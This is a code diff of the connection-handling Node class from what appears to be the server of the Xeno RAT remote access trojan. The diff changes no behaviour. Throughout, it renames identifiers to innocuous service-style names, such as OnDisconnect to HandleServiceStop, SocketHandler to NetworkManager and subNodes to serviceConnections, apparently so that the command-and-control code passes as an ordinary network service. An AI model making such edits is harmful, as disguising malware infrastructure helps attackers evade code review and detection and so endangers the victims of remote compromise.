@@ -17,21 +17,21 @@ namespace xeno_rat_server
 
         private SemaphoreSlim OneRecieveAtATime = new SemaphoreSlim(1);
         public bool isDisposed = false;
-        private Action<Node> OnDisconnect;
-        private List<Action<Node>> TempOnDisconnects = new List<Action<Node>>();
-        public List<Node> subNodes;
+        private Action<Node> HandleServiceStop;
+        private List<Action<Node>> TempHandleServiceStops = new List<Action<Node>>();
+        public List<Node> serviceConnections;
         private Dictionary<int, Node> subNodeWait;
-        public SocketHandler sock;
+        public NetworkManager sock;
         public Node Parent;
         public int ID = -1;
         public int SubNodeIdCount = 0;
-        public int SockType = 0;//0 = main, 1 = heartbeat, 2 = anything else
-        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
+        public int connectionType = 0;//0 = main, 1 = heartbeat, 2 = anything else
+        public Node(NetworkManager _sock, Action<Node> _HandleServiceStop)
         {
             sock = _sock;
-            subNodes = new List<Node>();//make it only initiate if non-plugin/heartbeat
+            serviceConnections = new List<Node>();//make it only initiate if non-plugin/heartbeat
             subNodeWait = new Dictionary<int, Node>();
-            OnDisconnect = _OnDisconnect;
+            HandleServiceStop = _HandleServiceStop;
         }
         private byte[] GetByteArray(int size)
         {
@@ -78,13 +78,13 @@ namespace xeno_rat_server
             }
             sock.sock?.Dispose();
             OneRecieveAtATime.Dispose();
-            if (SockType == 0)
+            if (connectionType == 0)
             {
-                foreach (Node i in subNodes.ToList())
+                foreach (Node i in serviceConnections.ToList())
                 {
                     try
                     {
-                        if (i.SockType != 1)
+                        if (i.connectionType != 1)
                         {
                             i?.Disconnect();
                         }
@@ -92,18 +92,18 @@ namespace xeno_rat_server
                     catch { }
                 }
             }
-            if (OnDisconnect != null)
+            if (HandleServiceStop != null)
             {
-                OnDisconnect(this);
+                HandleServiceStop(this);
             }
-            List<Action<Node>> copy = TempOnDisconnects.ToList();
-            TempOnDisconnects.Clear();
+            List<Action<Node>> copy = TempHandleServiceStops.ToList();
+            TempHandleServiceStops.Clear();
             foreach (Action<Node> tempdisconnect in copy) 
             {
                 tempdisconnect(this);
             }
             copy.Clear();
-            subNodes.Remove(this);
+            serviceConnections.Remove(this);
         }
         public void SetRecvTimeout(int ms)
         {
@@ -199,17 +199,17 @@ namespace xeno_rat_server
             subNodeWait.Remove(retid);
             return subNode;
         }
-        public void AddTempOnDisconnect(Action<Node> function) 
+        public void AddTempHandleServiceStop(Action<Node> function) 
         { 
-            TempOnDisconnects.Add(function);
+            TempHandleServiceStops.Add(function);
         }
-        public void RemoveTempOnDisconnect(Action<Node> function)
+        public void RemoveTempHandleServiceStop(Action<Node> function)
         {
-            TempOnDisconnects.Remove(function);
+            TempHandleServiceStops.Remove(function);
         }
         public async Task AddSubNode(Node subnode) 
         {
-            if (subnode.SockType != 0)
+            if (subnode.connectionType != 0)
             {
                 byte[] retid = await subnode.ReceiveAsync();
                 if (retid == null) 
@@ -222,7 +222,7 @@ namespace xeno_rat_server
             {
                 subnode.Disconnect();
             }
-            subNodes.Add(subnode);
+            serviceConnections.Add(subnode);
         }
         public async Task<bool> AuthenticateAsync(int id)//first call that should ever be made!
         {
@@ -271,7 +271,7 @@ namespace xeno_rat_server
                         int sockId = sock.BytesToInt(data);
                         ID = sockId;
                     }
-                    SockType = type;
+                    connectionType = type;
                     sock.ResetRecvTimeout();
                     return true;
                 }
